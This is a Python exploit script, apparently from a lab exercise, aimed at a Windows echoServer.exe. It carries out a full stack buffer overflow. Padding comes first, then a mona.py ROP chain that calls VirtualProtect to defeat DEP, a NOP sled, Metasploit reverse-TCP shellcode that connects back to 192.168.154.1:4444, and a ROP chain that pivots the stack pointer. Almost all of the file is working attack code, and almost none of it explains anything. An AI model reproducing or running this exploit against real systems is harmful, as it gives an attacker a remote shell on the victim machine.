import sys, subprocess, struct, os, socket



def enable_x_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	#[---INFO:gadgets_to_set_ebp:---]
	0x75ee6bee,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR
	0x75ee6bee,  # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_ebx:---]
	0x777513c5,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
	0x00000201,  # 0x00000201-> ebx
	#[---INFO:gadgets_to_set_edx:---]
	0x75f4f2d3,  # POP EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
	0x00000040,  # 0x00000040-> edx
	#[---INFO:gadgets_to_set_ecx:---]
	0x771e99a0,  # POP ECX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
	0x70e68fe7,  # &Writable location [mswsock.dll] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_edi:---]
	0x7562b36e,  # POP EDI # RETN [SspiCli.dll] ** REBASED ** ASLR 
	0x7774ae1a,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
	#[---INFO:gadgets_to_set_esi:---]
	0x77749f39,  # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
	0x756272f4,  # JMP [EAX] [SspiCli.dll]
	0x771b16b7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
	0x004061bc,  # ptr to &VirtualProtect() [IAT echoServer.exe] ** ASLR
	#[---INFO:pushad:---]
	0x77ee795c,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
	#[---INFO:extras:---]
	0x77102924,  # ptr to 'call esp' [KERNELBASE.dll] ** REBASED ** ASLR
	]
	return ''.join(struct.pack('<I', i) for i in rop_gadgets)

def mov_esp_up_chain():
	'''our shell code is at the buffer- we can't write that big shellcode after the buffer (and
	the rop chain). The DEP prevents us to execute the shellcode at the buffer. so we will need
	to enable execute bit to the buffer (and not to the end of it as usual) so in order to use
	enable_x_rop_chain that mona.py gave us we will need to change esp to the start of the buffer
	(or not far before), and then we will be able to use enable_x_rop_chain, and to execute the
	shellcode.
	so we will use this little rop chain to move esp up.'''
	rop_gadgets = [
	#mov eax, edx
	0x771a0337,  # MOV EAX,EDX # RETN
	#pop ecx = 212
	0x77e9283b,  # POP ECX # RETN
	0x77e9283b,  # POP ECX # RETN
	212,
	#add eax,acx
	0x7720002e,  # ADD EAX,ECX # RETN
	#xch eax, esp
	0x77185655,  # XCHG EAX,ESP # RETN]
	]
	return ''.join(struct.pack('<I', i) for i in rop_gadgets)

set_esp = mov_esp_up_chain()
rop_chain = enable_x_rop_chain()


# windows/shell_reverse_tcp - 324 bytes
# https://metasploit.com/
# VERBOSE=false, LHOST=192.168.154.1, LPORT=4444,
# ReverseAllowProxy=false, ReverseListenerThreaded=false,
# StagerRetryCount=10, StagerRetryWait=5,
# PrependMigrate=false, EXITFUNC=process, CreateSession=true
# 
# You should change the ip in the appropriate places.
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x9a\x01\x68"
buf += b"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
buf += b""
 

USAGE = "Usage: echoServer.py server_addr server_port"

def main():
	if len(sys.argv) != 3:
		print(USAGE)
		exit()
	server_addr, server_port = sys.argv[1:]
	server_port = int(server_port)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((server_addr, server_port))
	
	payload = b"secret\n" + b"a" * 1017 # first recv(1024)
	payload += rop_chain # The rop chain that enables execute bit
	# 					  must be here, before the shellcode
	payload += b"\x90" * (1048-len(buf)-len(rop_chain)) # nops
	payload += buf # shellcode
	payload += set_esp # rop chain that moves esp to start of rop_chain
	
	sock.send(payload)
	sock.recv(2048)
	sock.close()

if __name__=='__main__':
	main()
